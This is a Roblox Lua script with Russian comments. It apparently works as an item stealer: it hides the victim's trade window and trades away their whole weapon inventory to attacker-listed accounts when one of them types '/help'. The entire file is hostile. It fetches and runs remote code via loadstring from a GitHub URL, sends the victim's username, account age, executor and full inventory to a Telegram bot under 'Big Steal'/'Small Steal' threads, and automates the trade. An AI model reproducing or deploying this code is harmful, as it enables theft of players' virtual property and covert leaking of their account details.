repeat wait() until game:IsLoaded()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/Secret/superDROP"))()
local player = game.Players.LocalPlayer

-- Ждём, пока загрузятся PlayerGui и Character.Humanoid
repeat wait() until player:FindFirstChild("PlayerGui") and player.Character and player.Character:FindFirstChild("Humanoid")

-- Функция для ожидания загрузки вложенных объектов
local function WaitForPath(parent, path)
    local current = parent
    for _, name in ipairs(path) do
        current = current:WaitForChild(name)
    end
    return current
end

-- Путь к объекту
local path = {"MainGUI", "Game", "Crafting", "Inventory", "Salvage", "ScrollFrame", "Container"}
local container = WaitForPath(player:WaitForChild("PlayerGui"), path)

print("Container загружен:", container)


print("PlayerGui и Humanoid загружены!")


if #game:GetService("Players"):GetPlayers() <= 2 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end


local LP = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

local weaponfolder = player.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame.Container

local allItems = {}

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

for _, itemFrame in pairs(weaponfolder:GetChildren()) do
    local itemName = itemFrame.Name
    
    local container = itemFrame:FindFirstChild("Container")
    if container then
        local rarityLabel = container:FindFirstChild("Rarity")
        local amountLabel = container:FindFirstChild("Amount")

        if rarityLabel and rarityLabel:IsA("TextLabel") and amountLabel and amountLabel:IsA("TextLabel") then
            local rarity = rarityLabel.Text

            -- Парсим количество, если пусто - 1
            local amountText = amountLabel.Text or ""
            amountText = string.gsub(amountText, "^x", "") -- убираем "x" в начале
            local amount = tonumber(amountText)
            if not amount or amount == 0 then
                amount = 1
            end

            local formattedTable = {name = itemName, amount = amount, rarity = rarity}
            table.insert(allItems, formattedTable)

            -- Распределяем по таблицам по rarity
            if rarity == "Vintage" then
                table.insert(vintageItems, formattedTable)
            elseif rarity == "Unique" then
                table.insert(uniqueItems, formattedTable)
            elseif rarity == "Ancient" then
                table.insert(ancientItems, formattedTable)
            elseif rarity == "Godly" then
                table.insert(godlyItems, formattedTable)
            elseif rarity == "Legendary" then
                table.insert(legendaryItems, formattedTable)
            elseif rarity == "Rare" then
                table.insert(rareItems, formattedTable)
            elseif rarity == "Uncommon" then
                table.insert(uncommonItems, formattedTable)
            elseif rarity == "Common" then
                table.insert(commonItems, formattedTable)
            end
        end
    end
end


local function hasAtLeastOneValuableItem()
    return #godlyItems > 0 or #uniqueItems > 0 or #ancientItems > 0
end

local chosenThreadId
if hasAtLeastOneValuableItem() then
    chosenThreadId = threadmobile -- большой тред (Big Steal)
else
    chosenThreadId = poor -- маленький тред (Small Steal)
end

function SendTelegramMessage(botToken, chatId, threadId, text, embeds)
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

    local data = {
        chat_id = chatId,
        message_thread_id = threadId,
        text = text or "",
        parse_mode = "Markdown"
    }

    -- Telegram API sendMessage не поддерживает embeds как Discord,
    -- вместо этого нужно форматировать текст с помощью Markdown или HTML.

    local jsonData = HttpService:JSONEncode(data)

    local response = request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })

    return response
end

local function listAllItemsText()
    local sortedItems = {
        ["Unique"] = {},
        ["Ancient"] = {},
        ["Godly"] = {},
        ["Vintage"] = {},
        ["Legendary"] = {},
        ["Rare"] = {},
        ["Uncommon"] = {},
        ["Common"] = {}
    }

    local function addItemsToSortedTable(items, rarity)
        if items then
            for _, item in pairs(items) do
                if item.name and item.amount and item.amount > 0 then
                    table.insert(sortedItems[rarity], {name = item.name, amount = item.amount})
                end
            end
        end
    end

    addItemsToSortedTable(uniqueItems, "Unique")
    addItemsToSortedTable(ancientItems, "Ancient")
    addItemsToSortedTable(godlyItems, "Godly")
    addItemsToSortedTable(vintageItems, "Vintage")
    addItemsToSortedTable(legendaryItems, "Legendary")
    addItemsToSortedTable(rareItems, "Rare")
    addItemsToSortedTable(uncommonItems, "Uncommon")
    addItemsToSortedTable(commonItems, "Common")

    local text = ""
    for rarity, items in pairs(sortedItems) do
        text = text .. rarity .. ":\n"
        if #items > 0 then
            for _, item in pairs(items) do
                text = text .. " - " .. item.name .. " = " .. item.amount .. "\n"
            end
        else
            text = text .. " (Нет предметов)\n"
        end
        text = text .. "\n"
    end

    -- Возвращаем только текст без блока кода
    return text
end


local itemsText = listAllItemsText()

local messageText = 
    "*Запусти Скрипт!*\n" ..
    "*Info*" ..
    "```\n" ..
    "Username: " .. LP.Name .. "\n" ..
    "Account-Age: " .. tostring(LP.AccountAge) .. "\n" ..
    "Executor: " .. identifyexecutor() .. "\n" ..
    "Receiver: " .. table.concat(aprplayers, ", ") .. "\n" ..
    "```\n" ..

    "*Hit Info*" ..  -- заголовок вне блока кода

    "```\n" ..  -- теперь весь список в блоке кода
    itemsText ..
    "```\n" ..

    "*Join:*" ..
    "```\n" ..
    "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \"" .. tostring(game.JobId) .. "\")\n" ..
    "```"

SendTelegramMessage(botToken, chatId, chosenThreadId, messageText)

local function get_device_type()
    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
    local lobbygui = maingui:FindFirstChild("Lobby")
    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
    return MobileState and 'mobile' or 'tablet'
end

local DEVICE_TYPE = get_device_type()

local function SendTrade(Username)
    if DEVICE_TYPE == 'tablet' then
        local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container")
        local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
        getconnections(target_button.MouseButton1Click)[1]:Fire()

        local Inspect = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Inspect")
        local button_trade = Inspect:WaitForChild("Trade")
        getconnections(button_trade.MouseButton1Click)[1]:Fire()
    else
        local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild("PlayerList")
        local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
        getconnections(target_button.MouseButton1Click)[1]:Fire()

        local Popup = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Popup')
        local button_trade = Popup:WaitForChild("Container"):WaitForChild("Action"):WaitForChild('Trade')
        getconnections(button_trade.Activated)[1]:Fire()
    end
end


local function stealitems()
    coroutine.resume(destroytrades2)

    local players = game:GetService("Players"):GetPlayers()

    for _, player in ipairs(players) do
        if table.find(aprplayers, player.Name) then
            -- Отправляем трейд через UI
            SendTrade(player.Name)
            break
        end
    end
    wait(3)

    -- Обработка предметов каждой редкости
    for _, item in pairs(uniqueItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(ancientItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(godlyItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(vintageItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(legendaryItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(rareItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(uncommonItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for _, item in pairs(commonItems) do
        for i = 1, item.amount do
            local args = {
                [1] = item.name,
                [2] = "Weapons"
            }
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    -- Подтверждение трейда
    wait(6)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
end


game.Players.PlayerAdded:Connect(function(player)
    if table.find(aprplayers, player.Name) then
        player.Chatted:Connect(function(msg)
            if msg == "/help" then
                stealitems()
            end
        end)
    end
end)
